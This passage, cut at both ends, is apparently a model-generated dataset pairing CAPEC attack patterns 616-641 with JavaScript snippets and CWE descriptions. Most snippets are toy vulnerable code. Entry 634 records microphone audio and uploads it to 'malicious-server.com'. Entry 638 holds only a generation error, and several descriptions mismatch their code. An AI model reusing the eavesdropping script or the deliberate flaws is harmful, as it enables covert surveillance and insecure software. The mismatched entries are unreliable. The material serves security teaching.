        "description": "This JavaScript code snippet creates an HTTP server that listens on port 8080 and responds with sensitive information in cleartext. This embodies the main idea of the 'Evil Twin Wi-Fi Attack' by demonstrating how sensitive data can be intercepted when transmitted over an insecure channel. The code highlights CWE-319 (Cleartext Transmission of Sensitive Information) by sending sensitive data without encryption, making it vulnerable to interception by an adversary. This example also indirectly touches on other related CWEs, such as CWE-300, CWE-923, CWE-940, and CWE-924, by not verifying the identity of the communication endpoints and not ensuring the integrity of the transmitted data."
    },
    {
        "capec_id": "616",
        "capec_name": "Establish Rogue Location",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction loadResource(resourceName) {\n  const trustedPath = path.join(__dirname, 'trusted', resourceName);\n  const untrustedPath = path.join(__dirname, 'untrusted', resourceName);\n\n  if (fs.existsSync(untrustedPath)) {\n    // CWE-426: Untrusted Search Path\n    return fs.readFileSync(untrustedPath, 'utf8');\n  } else if (fs.existsSync(trustedPath)) {\n    return fs.readFileSync(trustedPath, 'utf8');\n  } else {\n    throw new Error('Resource not found');\n  }\n}\n\n// Example usage\ntry {\n  const data = loadResource('config.json');\n  console.log('Resource loaded:', data);\n} catch (err) {\n  console.error(err.message);\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where an application attempts to load a resource (e.g., 'config.json') from either a trusted or untrusted path. The function 'loadResource' first checks if the resource exists in the untrusted path and loads it if available, otherwise, it falls back to the trusted path. This embodies the CAPEC 'Establish Rogue Location' by allowing an adversary to place a malicious resource in the untrusted path, which the application may load without proper verification. The code also highlights CWE-426 (Untrusted Search Path) by prioritizing the untrusted path over the trusted one, potentially leading to the exposure of sensitive information (CWE-200), improper verification of the source (CWE-940), and resource leaks (CWE-402)."
    },
    {
        "capec_id": "617",
        "capec_name": "Cellular Rogue Base Station",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  console.log('Client connected');\n  socket.on('data', (data) => {\n    console.log('Received:', data.toString());\n    // Improper verification of source\n    if (data.toString().includes('AUTH')) {\n      socket.write('AUTH_OK');\n    } else {\n      socket.write('INVALID_REQUEST');\n    }\n  });\n  socket.on('end', () => {\n    console.log('Client disconnected');\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});\n\n// Simulate a rogue base station\nconst client = net.createConnection({ port: 8080 }, () => {\n  console.log('Connected to server');\n  client.write('AUTH'); // Rogue base station sending AUTH message\n});\nclient.on('data', (data) => {\n  console.log('Server response:', data.toString());\n  client.end();\n});\nclient.on('end', () => {\n  console.log('Disconnected from server');\n});",
        "description": "This JavaScript code snippet demonstrates a simple TCP server and client interaction, simulating a rogue base station attack. The server listens for incoming connections and processes data without properly verifying the source of the communication (CWE-940). The client, acting as a rogue base station, connects to the server and sends an 'AUTH' message. The server responds with 'AUTH_OK' without ensuring the integrity or authenticity of the message (CWE-924, CWE-923). This code highlights the vulnerability of improper verification and the potential for a rogue base station to exploit this weakness."
    },
    {
        "capec_id": "618",
        "capec_name": "Cellular Broadcast Message Request",
        "code_snippet": "const sendBroadcastMessage = (phoneNumber, message) => {\n  // CWE-201: Insertion of Sensitive Information Into Sent Data\n  const sensitiveData = `Phone: ${phoneNumber}, Message: ${message}`;\n  \n  // CWE-940: Improper Verification of Source of a Communication Channel\n  const isValidSource = (source) => source === 'trustedSource';\n  \n  // CWE-924: Improper Enforcement of Message Integrity During Transmission\n  const sendMessage = (data) => {\n    if (!isValidSource('untrustedSource')) {\n      console.error('Source verification failed');\n      return;\n    }\n    // CWE-300: Channel Accessible by Non-Endpoint\n    const communicationChannel = openChannel('broadcast');\n    communicationChannel.send(data);\n  };\n  \n  // CWE-927: Use of Implicit Intent for Sensitive Communication\n  const implicitIntent = { action: 'SEND_BROADCAST', data: sensitiveData };\n  sendMessage(implicitIntent);\n};\n\nsendBroadcastMessage('123-456-7890', 'Alert: Test Message');",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker could exploit vulnerabilities in a cellular broadcast message system. The function `sendBroadcastMessage` takes a phone number and a message as input and constructs a sensitive data string (CWE-201). It then attempts to send this data over a communication channel without properly verifying the source (CWE-940) and without ensuring message integrity (CWE-924). The communication channel is also not adequately secured, making it accessible by non-endpoints (CWE-300). Finally, the code uses an implicit intent to transmit sensitive data (CWE-927). This represents the main idea of the CAPEC, where an attacker could misuse the broadcast message system to track a target's location."
    },
    {
        "capec_id": "619",
        "capec_name": "Signal Strength Tracking",
        "code_snippet": "const sensitiveData = 'user_location';\n\nfunction sendData(data) {\n  // CWE-201: Insertion of Sensitive Information Into Sent Data\n  const payload = { location: data, timestamp: Date.now() };\n  fetch('http://example.com/track', {\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json'\n    },\n    body: JSON.stringify(payload)\n  }).then(response => {\n    if (!response.ok) {\n      throw new Error('Network response was not ok');\n    }\n    return response.json();\n  }).then(data => {\n    console.log('Success:', data);\n  }).catch(error => {\n    console.error('Error:', error);\n  });\n}\n\n// CWE-940: Improper Verification of Source of a Communication Channel\nfunction receiveData() {\n  fetch('http://example.com/data')\n    .then(response => response.json())\n    .then(data => {\n      if (data.source !== 'trusted_source') {\n        throw new Error('Untrusted source');\n      }\n      console.log('Received data:', data);\n    })\n    .catch(error => {\n      console.error('Error:', error);\n    });\n}\n\n// Simulate sending sensitive data\nsendData(sensitiveData);\n\n// Simulate receiving data\nreceiveData();",
        "description": "This JavaScript code snippet demonstrates a scenario where sensitive information, such as user location, is transmitted over a network without proper safeguards, embodying the main idea of the CAPEC 'Signal Strength Tracking'. The `sendData` function sends sensitive location data to a server, illustrating CWE-201 (Insertion of Sensitive Information Into Sent Data). The `receiveData` function fetches data from a server but fails to properly verify the source of the communication channel, illustrating CWE-940 (Improper Verification of Source of a Communication Channel). This code highlights vulnerabilities that could be exploited to track a user's location through signal strength monitoring."
    },
    {
        "capec_id": "620",
        "capec_name": "Drop Encryption Level",
        "code_snippet": "const crypto = require('crypto');\n\nfunction encrypt(data, algorithm) {\n  const key = 'hardcodedkey123456'; // CWE-321: Use of Hard-coded Cryptographic Key\n  const iv = crypto.randomBytes(16);\n  const cipher = crypto.createCipheriv(algorithm, Buffer.from(key), iv);\n  let encrypted = cipher.update(data, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return iv.toString('hex') + ':' + encrypted;\n}\n\nfunction negotiateAlgorithm(clientAlgorithms) {\n  const serverAlgorithms = ['aes-256-cbc', 'aes-128-cbc'];\n  // CWE-757: Selection of Less-Secure Algorithm During Negotiation\n  for (let alg of clientAlgorithms) {\n    if (serverAlgorithms.includes(alg)) {\n      return alg;\n    }\n  }\n  return 'aes-128-cbc'; // Default to a less secure algorithm\n}\n\nconst clientAlgorithms = ['aes-128-cbc']; // Client supports only a less secure algorithm\nconst selectedAlgorithm = negotiateAlgorithm(clientAlgorithms);\nconst sensitiveData = 'Sensitive Information';\nconst encryptedData = encrypt(sensitiveData, selectedAlgorithm);\nconsole.log('Encrypted Data:', encryptedData);",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker can force the encryption level to be lowered, making the encrypted data more vulnerable. The `negotiateAlgorithm` function simulates the negotiation process between a client and a server, where the server ends up selecting a less secure algorithm (CWE-757). The `encrypt` function uses a hard-coded cryptographic key (CWE-321) to encrypt sensitive data. The client only supports a less secure algorithm (`aes-128-cbc`), and the server defaults to this algorithm, thus lowering the encryption level. This embodies the main idea of the CAPEC 'Drop Encryption Level' by showing how an attacker can influence the negotiation process to use a weaker encryption algorithm."
    },
    {
        "capec_id": "621",
        "capec_name": "Analysis of Packet Timing and Sizes",
        "code_snippet": "const http = require('http');\nconst sensitiveData = 'user_password=secret123';\n\nconst options = {\n  hostname: 'example.com',\n  port: 80,\n  path: '/login',\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/x-www-form-urlencoded',\n    'Content-Length': Buffer.byteLength(sensitiveData)\n  }\n};\n\nconst req = http.request(options, (res) => {\n  let data = '';\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n  res.on('end', () => {\n    console.log('Response:', data);\n  });\n});\n\nreq.on('error', (e) => {\n  console.error(`Problem with request: ${e.message}`);\n});\n\nreq.write(sensitiveData);\nreq.end();",
        "description": "This JavaScript code snippet demonstrates a basic HTTP POST request that transmits sensitive information (a user password) in cleartext. The code uses the 'http' module to send a POST request to 'example.com' with the sensitive data 'user_password=secret123'. This embodies the main idea of CAPEC-Analysis of Packet Timing and Sizes, as an attacker could intercept and log the encrypted transmission, analyzing metadata such as packet timing and sizes. The related CWEs are represented as follows: CWE-201 (Insertion of Sensitive Information Into Sent Data) is shown by including the sensitive password in the transmitted data, CWE-319 (Cleartext Transmission of Sensitive Information) is demonstrated by sending the password in cleartext, and CWE-208 (Observable Timing Discrepancy) could be inferred by the timing of the request and response, potentially revealing security-relevant information."
    },
    {
        "capec_id": "622",
        "capec_name": "Electromagnetic Side-Channel Attack",
        "code_snippet": "const crypto = require('crypto');\n\nfunction encryptData(data, key) {\n  const cipher = crypto.createCipher('aes-256-cbc', key);\n  let encrypted = cipher.update(data, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n}\n\nfunction sendData(data) {\n  const key = '12345678901234567890123456789012'; // Weak key\n  const encryptedData = encryptData(data, key);\n  console.log('Sending data:', encryptedData);\n}\n\nconst sensitiveData = 'Sensitive Information';\nsendData(sensitiveData);",
        "description": "This JavaScript code snippet demonstrates a scenario where sensitive information is encrypted using a weak cryptographic key and then transmitted. The `encryptData` function uses the 'aes-256-cbc' algorithm with a hardcoded key, which is a poor practice (CWE-327). The `sendData` function logs the encrypted data to the console, simulating data transmission. This setup is vulnerable to electromagnetic side-channel attacks (CAPEC-201) because the weak key and the lack of proper protection mechanisms (CWE-1300) make it easier for an attacker to derive the key by monitoring electromagnetic emissions. Additionally, the hardcoded key represents a channel accessible by non-endpoints (CWE-300), further compromising security."
    },
    {
        "capec_id": "623",
        "capec_name": "Compromising Emanations Attack",
        "code_snippet": "const sensitiveData = 'user_password';\n\nfunction sendData() {\n  // Simulate sending data over a network\n  console.log('Sending data: ' + sensitiveData);\n}\n\nfunction processButtonPress() {\n  // Simulate a button press that causes an acoustic emission\n  console.log('Button pressed');\n  sendData();\n}\n\n// Simulate a button press event\nprocessButtonPress();",
        "description": "This JavaScript code snippet demonstrates a scenario where sensitive information (user_password) is transmitted over a network when a button is pressed. The button press event generates an acoustic emission, which can be captured and analyzed by an attacker to infer the sensitive data being processed. This embodies the main idea of a Compromising Emanations Attack (CAPEC-201) by showing how physical side channels (acoustic emissions) can be exploited to compromise sensitive information. The code also touches on related CWEs, such as the insertion of sensitive information into sent data (CWE-201) and improper protection of physical side channels (CWE-1300)."
    },
    {
        "capec_id": "624",
        "capec_name": "Hardware Fault Injection",
        "code_snippet": "class Device {\n  constructor() {\n    this.voltage = 5; // Normal operating voltage\n    this.clockSpeed = 1000; // Normal clock speed in MHz\n    this.temperature = 25; // Normal operating temperature in Celsius\n  }\n\n  performOperation() {\n    if (this.voltage < 4.5 || this.voltage > 5.5) {\n      console.log('Voltage glitch detected! Operation aborted.');\n      return;\n    }\n    if (this.clockSpeed < 950 || this.clockSpeed > 1050) {\n      console.log('Clock glitch detected! Operation aborted.');\n      return;\n    }\n    if (this.temperature < 0 || this.temperature > 70) {\n      console.log('Temperature anomaly detected! Operation aborted.');\n      return;\n    }\n    console.log('Operation performed successfully.');\n  }\n}\n\n// Simulate a fault injection attack\nlet device = new Device();\ndevice.voltage = 3; // Voltage glitch\n// device.clockSpeed = 1100; // Uncomment to simulate clock glitch\n// device.temperature = -10; // Uncomment to simulate temperature anomaly\ndevice.performOperation();",
        "description": "This JavaScript code snippet represents a simplified model of a hardware device that performs an operation. The device has normal operating parameters for voltage, clock speed, and temperature. The `performOperation` method checks for anomalies in these parameters, such as voltage glitches, clock glitches, and temperature anomalies, which are common fault injection techniques described in the CAPEC. If any anomaly is detected, the operation is aborted to prevent faulty behavior. This code embodies the main idea of the CAPEC by demonstrating how improper protection against these anomalies can lead to faulty behavior, potentially compromising the device's security."
    },
    {
        "capec_id": "625",
        "capec_name": "Mobile Device Fault Injection",
        "code_snippet": "function performSensitiveOperation() {\n  // Simulate a sensitive cryptographic operation\n  let secretKey = 'superSecretKey';\n  let result = cryptoOperation(secretKey);\n  return result;\n}\n\nfunction cryptoOperation(key) {\n  // Simulate a fault injection vulnerability\n  if (Math.random() < 0.1) { // 10% chance to simulate a fault\n    console.log('Fault injected! Skipping critical operation.');\n    return 'faultyResult';\n  }\n  // Normal cryptographic operation\n  return 'secureResult';\n}\n\nconsole.log(performSensitiveOperation());",
        "description": "This JavaScript code snippet simulates a fault injection attack on a mobile device performing a cryptographic operation. The `performSensitiveOperation` function represents a sensitive operation that uses a secret key. The `cryptoOperation` function simulates the cryptographic process, with a 10% chance to simulate a fault injection (e.g., voltage or clock glitch) that causes the operation to skip a critical step, leading to a 'faultyResult'. This represents the vulnerability described in the CAPEC, where fault injection can compromise the security of cryptographic operations. The code highlights the potential for such faults to occur and the need for proper protections against them."
    },
    {
        "capec_id": "626",
        "capec_name": "Smudge Attack",
        "code_snippet": "document.addEventListener('touchend', function(event) {\n  let touch = event.changedTouches[0];\n  let x = touch.pageX;\n  let y = touch.pageY;\n  console.log('Touch coordinates: (' + x + ', ' + y + ')');\n  // Simulate storing touch coordinates for potential smudge attack analysis\n  localStorage.setItem('lastTouch', JSON.stringify({x: x, y: y}));\n});\n\n// Simulate a function that could be used to analyze smudge patterns\nfunction analyzeSmudgePattern() {\n  let lastTouch = JSON.parse(localStorage.getItem('lastTouch'));\n  if (lastTouch) {\n    console.log('Analyzing smudge pattern at coordinates: (' + lastTouch.x + ', ' + lastTouch.y + ')');\n    // Potentially vulnerable analysis logic here\n  }\n}\n\n// Call the analysis function (in a real scenario, this could be triggered by an attacker)\nanalyzeSmudgePattern();",
        "description": "This JavaScript code snippet demonstrates a simplified version of a smudge attack on a touchscreen device. The 'touchend' event listener captures the coordinates of the user's touch and stores them in localStorage. The 'analyzeSmudgePattern' function simulates the analysis of these touch coordinates to infer a pattern, which could be used by an attacker to guess the user's password or passcode. This code embodies the main idea of the CAPEC by showing how physical side channels (touch smudges) can be exploited to reveal sensitive information. The use of localStorage to store touch data highlights the CWE-1300 (Improper Protection of Physical Side Channels) and CWE-1125 (Excessive Attack Surface) by demonstrating how easily accessible data can be used for malicious purposes."
    },
    {
        "capec_id": "627",
        "capec_name": "Counterfeit GPS Signals",
        "code_snippet": "const gpsReceiver = { receiveSignal: (signal) => { if (!verifySource(signal.source)) { console.log('Warning: Unverified GPS signal source'); return; } if (!verifyIntegrity(signal)) { console.log('Warning: GPS signal integrity compromised'); return; } processSignal(signal); }, }; function verifySource(source) { // Improper verification of source (CWE-940) return source === 'trustedSource'; } function verifyIntegrity(signal) { // Improper enforcement of message integrity (CWE-924) return signal.integrityCheck === 'valid'; } function processSignal(signal) { // Process the GPS signal (e.g., update position) console.log('Processing GPS signal:', signal); } // Simulated spoofed GPS signal const spoofedSignal = { source: 'maliciousSource', integrityCheck: 'invalid', data: 'fakeGPSData' }; gpsReceiver.receiveSignal(spoofedSignal);",
        "description": "This JavaScript code snippet simulates a GPS receiver that processes incoming GPS signals. The `gpsReceiver` object has a `receiveSignal` method that takes a signal as input. The method first attempts to verify the source of the signal using the `verifySource` function, which is improperly implemented to only check if the source is 'trustedSource' (CWE-940). Next, it checks the integrity of the signal using the `verifyIntegrity` function, which is also improperly implemented to only check if the integrityCheck field is 'valid' (CWE-924). If either verification fails, a warning is logged, and the signal is not processed. The `processSignal` function simulates the processing of a valid GPS signal. A spoofed GPS signal is then created with a malicious source and invalid integrity check, and it is passed to the `receiveSignal` method, demonstrating how the system can be deceived by counterfeit GPS signals (CAPEC-)."
    },
    {
        "capec_id": "628",
        "capec_name": "Carry-Off GPS Attack",
        "code_snippet": "const gpsReceiver = { currentLocation: { lat: 0, lon: 0 }, receiveSignal: function(signal) { if (this.verifySignal(signal)) { this.currentLocation = signal.location; } }, verifySignal: function(signal) { // CWE-940: Improper Verification of Source of a Communication Channel return signal.source === 'trusted'; } }; const spoofedSignal = { source: 'attacker', location: { lat: 10, lon: 10 } }; setInterval(() => { gpsReceiver.receiveSignal(spoofedSignal); console.log(`Current Location: ${gpsReceiver.currentLocation.lat}, ${gpsReceiver.currentLocation.lon}`); }, 1000);",
        "description": "This JavaScript code snippet simulates a GPS receiver that updates its current location based on incoming signals. The 'receiveSignal' function updates the receiver's location if the signal passes the 'verifySignal' check. However, the 'verifySignal' function only checks if the signal's source is 'trusted', which is a simplistic and flawed verification method (CWE-940: Improper Verification of Source of a Communication Channel). An attacker can exploit this by sending spoofed signals with a source that appears trusted, gradually changing the receiver's location (Carry-Off GPS Attack). The code demonstrates how improper verification can lead to a GPS spoofing attack."
    },
    {
        "capec_id": "629",
        "capec_name": "DEPRECATED: Unauthorized Use of Device Resources",
        "code_snippet": "const fs = require('fs');\n\nfunction readFile(filePath) {\n  if (!isAuthorized(filePath)) {\n    console.log('Unauthorized access attempt detected.');\n    return;\n  }\n\n  fs.readFile(filePath, 'utf8', (err, data) => {\n    if (err) {\n      console.error('Error reading file:', err);\n      return;\n    }\n    console.log('File content:', data);\n  });\n}\n\nfunction isAuthorized(filePath) {\n  // Simulate an incorrect authorization check\n  return filePath !== 'restricted.txt';\n}\n\n// Simulate user input\nconst userInput = 'CON';\nreadFile(userInput);",
        "description": "This JavaScript code snippet demonstrates a scenario where unauthorized use of device resources can occur due to improper handling of Windows device names and incorrect authorization checks. The `readFile` function attempts to read a file specified by `filePath`. It first checks if the file path is authorized using the `isAuthorized` function, which contains a flawed authorization logic. If the file path is 'restricted.txt', access is denied; otherwise, access is granted. However, the code does not handle special Windows device names like 'CON', leading to potential denial of service or information exposure. This snippet embodies the main idea of the deprecated CAPEC by showing how improper resource handling and authorization can lead to vulnerabilities."
    },
    {
        "capec_id": "630",
        "capec_name": "TypoSquatting",
        "code_snippet": "const trustedDomain = 'https://www.example.com';\nconst userInput = 'https://www.examp1e.com'; // User input with a typo\n\nfunction redirectToDomain(input) {\n  if (input.startsWith(trustedDomain)) {\n    window.location.href = input;\n  } else {\n    console.log('Redirect blocked: Untrusted domain');\n  }\n}\n\nredirectToDomain(userInput);",
        "description": "This JavaScript code snippet demonstrates a potential TypoSquatting vulnerability. The `redirectToDomain` function takes a user-provided URL and redirects the browser to that URL if it starts with the trusted domain. However, due to a typo in the user input ('https://www.examp1e.com' instead of 'https://www.example.com'), the function fails to correctly identify the trusted domain and blocks the redirect. This snippet highlights the risk of TypoSquatting attacks where users might be redirected to malicious sites due to typos. The code also touches on CWE-601 (Open Redirect) by showing how user-controlled input can be used in redirects, CWE-697 (Incorrect Comparison) by demonstrating a flawed comparison check, and CWE-115 (Misinterpretation of Input) by showing how user input can be misinterpreted in a security-relevant context."
    },
    {
        "capec_id": "631",
        "capec_name": "SoundSquatting",
        "code_snippet": "const trustedDomain = 'trusted-site.com';\nconst userInputDomain = 'trvsted-site.com'; // SoundSquatting domain\n\nfunction redirectToDomain(domain) {\n  if (domain === trustedDomain) {\n    window.location.href = `https://${domain}`;\n  } else {\n    console.log('Untrusted domain detected!');\n  }\n}\n\n// Simulate user input\nredirectToDomain(userInputDomain);",
        "description": "This JavaScript code snippet demonstrates a potential SoundSquatting attack. The trusted domain is 'trusted-site.com', but the user input domain is 'trvsted-site.com', which sounds similar but is spelled differently. The function 'redirectToDomain' checks if the input domain matches the trusted domain and redirects the user if it does. If the domain does not match, it logs a message indicating an untrusted domain. This snippet highlights the vulnerability of URL redirection to untrusted sites (CWE-601) and the potential for user confusion due to similar-sounding domain names (SoundSquatting)."
    },
    {
        "capec_id": "632",
        "capec_name": "Homograph Attack via Homoglyphs",
        "code_snippet": "const trustedDomain = 'example.com';\nconst userInput = 'examp1e.com'; // Homoglyph attack: '1' instead of 'l'\n\nfunction isTrustedDomain(input) {\n  const regex = new RegExp(`^${trustedDomain.replace('.', '\\.')}$`, 'i');\n  return regex.test(input);\n}\n\nif (isTrustedDomain(userInput)) {\n  console.log('Access granted to trusted domain.');\n} else {\n  console.log('Access denied. Potential homograph attack detected.');\n}",
        "description": "This JavaScript code snippet demonstrates a potential vulnerability to a homograph attack via homoglyphs. The trusted domain is 'example.com', but the user input is 'examp1e.com', where the digit '1' is used instead of the letter 'l'. The function 'isTrustedDomain' uses a regular expression to check if the user input matches the trusted domain. However, this simplistic check does not account for visually similar characters (homoglyphs), making it vulnerable to homograph attacks. The code highlights the importance of properly distinguishing between visually similar characters to prevent such attacks. This example also touches on CWE-1007 (Insufficient Visual Distinction of Homoglyphs Presented to User) and CWE-777 (Regular Expression without Anchors) by showing how improper handling of user input can lead to security vulnerabilities."
    },
    {
        "capec_id": "633",
        "capec_name": "Token Impersonation",
        "code_snippet": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\n// Secret key for JWT\nconst secretKey = 'supersecretkey';\n\n// Middleware to authenticate token\nfunction authenticateToken(req, res, next) {\n  const token = req.headers['authorization'];\n  if (!token) return res.sendStatus(403);\n\n  jwt.verify(token, secretKey, (err, user) => {\n    if (err) return res.sendStatus(403);\n    req.user = user;\n    next();\n  });\n}\n\n// Vulnerable endpoint that generates a token without proper validation\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  // Weak authentication: no password check\n  const user = { name: username };\n  const token = jwt.sign(user, secretKey);\n  res.json({ token });\n});\n\n// Protected route\napp.get('/protected', authenticateToken, (req, res) => {\n  res.send(`Hello ${req.user.name}, you have access to this protected route.`);\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a simple Express.js application that uses JSON Web Tokens (JWT) for authentication. The '/login' endpoint generates a token for a user without proper validation (e.g., no password check), embodying CWE-287 (Improper Authentication) and CWE-1390 (Weak Authentication). The 'authenticateToken' middleware verifies the token and allows access to the '/protected' route. This setup is vulnerable to token impersonation attacks, as an adversary can easily obtain a token by simply providing a username, exploiting the weak authentication mechanism."
    },
    {
        "capec_id": "634",
        "capec_name": "Probe Audio and Video Peripherals",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst { exec } = require('child_process');\n\n// CWE-267: Privilege Defined With Unsafe Actions\nexec('arecord -d 10 /tmp/audio_capture.wav', (err) => {\n  if (err) throw err;\n  console.log('Audio captured');\n\n  // CWE-319: Cleartext Transmission of Sensitive Information\n  const options = {\n    hostname: 'malicious-server.com',\n    port: 80,\n    path: '/upload',\n    method: 'POST',\n    headers: {\n      'Content-Type': 'audio/wav'\n    }\n  };\n\n  const req = http.request(options, (res) => {\n    res.on('data', (d) => {\n      process.stdout.write(d);\n    });\n  });\n\n  req.on('error', (e) => {\n    console.error(e);\n  });\n\n  // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n  const audioStream = fs.createReadStream('/tmp/audio_capture.wav');\n  audioStream.pipe(req);\n  audioStream.on('end', () => {\n    req.end();\n  });\n});",
        "description": "This JavaScript code snippet demonstrates a malicious script that captures audio from a system's microphone and transmits it to a remote server. The script uses the 'arecord' command to record audio for 10 seconds and saves it to a temporary file. It then sends this audio file to a remote server over HTTP in cleartext. This embodies the CAPEC idea of exploiting audio peripherals to capture sensitive information. The code also highlights several related CWEs: CWE-267 (Privilege Defined With Unsafe Actions) by executing a system command to record audio, CWE-319 (Cleartext Transmission of Sensitive Information) by sending the audio file over HTTP without encryption, and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by exposing the recorded audio to an unauthorized remote server."
    },
    {
        "capec_id": "635",
        "capec_name": "Alternative Execution Due to Deceptive Filenames",
        "code_snippet": "const express = require('express');\nconst fileUpload = require('express-fileupload');\nconst path = require('path');\nconst app = express();\n\napp.use(fileUpload());\n\napp.post('/upload', (req, res) => {\n  if (!req.files || Object.keys(req.files).length === 0) {\n    return res.status(400).send('No files were uploaded.');\n  }\n\n  let uploadedFile = req.files.uploadedFile;\n  let uploadPath = path.join(__dirname, 'uploads', uploadedFile.name);\n\n  // Save the file to the server\n  uploadedFile.mv(uploadPath, (err) => {\n    if (err) {\n      return res.status(500).send(err);\n    }\n\n    // Check file extension\n    let fileExtension = path.extname(uploadedFile.name);\n    if (fileExtension !== '.txt') {\n      return res.status(400).send('Invalid file type. Only .txt files are allowed.');\n    }\n\n    res.send('File uploaded!');\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server started on http://localhost:3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework and the express-fileupload middleware to handle file uploads. The main idea of the CAPEC is represented by the potential vulnerability in handling file uploads based on their extensions. The code checks the file extension after saving the file to the server, which is a flawed approach. An attacker could upload a file with a deceptive filename, such as 'malicious.txt.exe', which might bypass the extension check and be executed as an executable file. This demonstrates CWE-646 (Reliance on File Name or Extension of Externally-Supplied File) and CWE-73 (External Control of File Name or Path). The code also does not properly neutralize special elements in filenames (CWE-162) and does not restrict the names of uploaded files (CWE-641)."
    },
    {
        "capec_id": "636",
        "capec_name": "Hiding Malicious Data or Code within Files",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Function to hide malicious code in an image file's metadata\nfunction hideMaliciousCode(imagePath, maliciousCode) {\n  const imageBuffer = fs.readFileSync(imagePath);\n  const metadata = `<!-- ${maliciousCode} -->`;\n  const hiddenData = Buffer.concat([imageBuffer, Buffer.from(metadata)]);\n  fs.writeFileSync(imagePath, hiddenData);\n}\n\n// Example usage\nconst imagePath = path.join(__dirname, 'example.jpg');\nconst maliciousCode = 'console.log(\"Malicious code executed\");';\nhideMaliciousCode(imagePath, maliciousCode);",
        "description": "This JavaScript code snippet demonstrates how an attacker might hide malicious code within the metadata of an image file. The `hideMaliciousCode` function reads the image file into a buffer, appends a comment containing the malicious code to the buffer, and then writes the modified buffer back to the file. This embodies the CAPEC concept of hiding malicious data within files. The related CWEs are represented as follows: CWE-506 (Embedded Malicious Code) by embedding the malicious code in the image metadata, CWE-219 (Storage of File with Sensitive Data Under Web Root) by potentially placing the image in a web-accessible directory, CWE-313 (Cleartext Storage in a File or on Disk) by storing the malicious code in cleartext, CWE-318 (Cleartext Storage of Sensitive Information in Executable) by potentially executing the malicious code if the image is processed by a vulnerable application, and CWE-515 (Covert Storage Channel) by using the image file's metadata as a covert channel to store the malicious code."
    },
    {
        "capec_id": "637",
        "capec_name": "Collect Data from Clipboard",
        "code_snippet": "document.addEventListener('copy', function(event) {\n  var clipboardData = event.clipboardData || window.clipboardData;\n  var copiedText = clipboardData.getData('text');\n  // Log the copied text to the console (simulating exfiltration)\n  console.log('Copied text:', copiedText);\n  // Store the copied text in local storage (cleartext storage vulnerability)\n  localStorage.setItem('copiedText', copiedText);\n});",
        "description": "This JavaScript code snippet listens for the 'copy' event, which is triggered when a user copies text to the clipboard. When the event occurs, it retrieves the copied text from the clipboard and logs it to the console, simulating the exfiltration of sensitive information. Additionally, it stores the copied text in the browser's local storage in cleartext, demonstrating a cleartext storage vulnerability. This code embodies the main idea of CAPEC-Collect Data from Clipboard by showing how an adversary can exploit clipboard data to gather unauthorized information. The related CWEs are represented by the unsafe logging and storage of sensitive information."
    },
    {
        "capec_id": "638",
        "capec_name": "Altered Component Firmware",
        "code_snippet": "User intervention needed!",
        "description": "The model failed to generate a description for this code snippet. Error: Could not parse response content as the length limit was reached - CompletionUsage(completion_tokens=4096, prompt_tokens=571, total_tokens=4667, completion_tokens_details=CompletionTokensDetails(reasoning_tokens=0))"
    },
    {
        "capec_id": "639",
        "capec_name": "Probe System Files",
        "code_snippet": "const fs = require('fs');\nconst path = '/tmp/sensitive_info.txt';\n\n// Writing sensitive information to a file with improper permissions\nfs.writeFileSync(path, 'Sensitive Information', { mode: 0o666 });\n\n// Reading the file without proper access control\nfs.readFile(path, 'utf8', (err, data) => {\n  if (err) throw err;\n  console.log(data);\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerability where sensitive information is written to a file with improper permissions, making it accessible to unauthorized users. The file is created in the '/tmp' directory with permissions set to 0o666, which allows read and write access to all users. This embodies the CAPEC 'Probe System Files' by showing how sensitive information can be exposed due to improperly protected files. The related CWEs are represented by the insecure temporary file creation (CWE-377), files accessible to external parties (CWE-552), and exposure of sensitive information (CWE-497)."
    },
    {
        "capec_id": "640",
        "capec_name": "Inclusion of Code in Existing Process",
        "code_snippet": "const fs = require('fs');\nconst vm = require('vm');\n\n// CWE-829: Including functionality from an untrusted source\nconst untrustedCode = fs.readFileSync('untrustedLibrary.js', 'utf8');\n\n// CWE-913: Improper control of dynamically-managed code resources\nconst sandbox = { process: process, require: require, console: console };\n\n// CWE-114: Process control vulnerability\ntry {\n  vm.createContext(sandbox);\n  vm.runInContext(untrustedCode, sandbox);\n} catch (e) {\n  console.error('Error executing untrusted code:', e);\n}\n",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an application includes and executes code from an untrusted source, which can lead to arbitrary code execution within the context of the running process. The code reads an external JavaScript file ('untrustedLibrary.js') and executes it within a sandboxed environment using Node.js's 'vm' module. This represents the CAPEC's main idea of an adversary injecting and executing arbitrary code in the address space of a live process. The related CWEs are illustrated as follows: CWE-829 by reading and including code from an untrusted source, CWE-913 by improperly managing the execution context, and CWE-114 by allowing the execution of potentially malicious commands within the process."
    },
    {
        "capec_id": "641",
        "capec_name": "DLL Side-Loading",
